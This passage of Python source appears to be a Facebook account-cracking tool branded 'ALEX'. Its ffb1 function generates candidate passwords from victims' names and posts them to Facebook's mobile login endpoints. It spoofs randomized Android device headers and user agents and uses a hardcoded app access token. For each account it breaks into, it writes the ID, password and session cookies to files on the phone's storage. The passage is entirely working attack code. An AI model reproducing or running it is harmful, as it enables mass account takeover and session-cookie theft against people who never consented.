                        head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua12, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        ALEX=session.cookies.get_dict().keys()
                        if "c_user" in ALEX:
                                coki=session.cookies.get_dict()
                                cookie = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [ALEX-ALIVE] '+ids+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
                                if ids[:4] in ['1000']:
                                	open(f'/sdcard/ALEX-ALIVE-OLD.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                elif ids[:4] in ['6155']:
                                	open(f'/sdcard/ALEX-ALIVE-NEW.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                open(f'/sdcard/ALEX-OK.txt', 'a').write(ids+'|'+pas+'\n')                                	
                                open(f'/sdcard/Alex-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ALEX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m [CHECKPOINT] '+ids+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
                                        open(f'/sdcard/ALEX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:
                pass

def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ALEX-CRACKING]  %s | ALIVE: %s | CHECKPOINT: %s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        android_version=str(random.randrange(6,13))
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        model = random.choice(['itel vesion 3 plus','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                        fbap = random.choice(['738.0.0.11.397','60.0.0.16.76','419.0.0.20.71','504.0.0.28482','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','400.0.0.37.76','414.0.0.30.113','408.1.0.16.113'])
                        
                        ua11 = random.choice(useragent1)
                        
                        head = {'Host': 'd.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua11, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
                        getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        ALEX=session.cookies.get_dict().keys()
                        if "c_user" in ALEX:
                                coki=session.cookies.get_dict()
                                cookie = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [ALEX-ALIVE] '+ids+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
                                if ids[:4] in ['1000']:
                                	open(f'/sdcard/ALEX-ALIVE-OLD.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                elif ids[:4] in ['6155']:
                                	open(f'/sdcard/ALEX-ALIVE-NEW.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                open(f'/sdcard/ALEX-OK.txt', 'a').write(ids+'|'+pas+'\n')                                	
                                open(f'/sdcard/Alex-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ALEX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m [CHECKPOINT] '+ids+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
                                        open(f'/sdcard/ALEX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:
                pass

menu()                                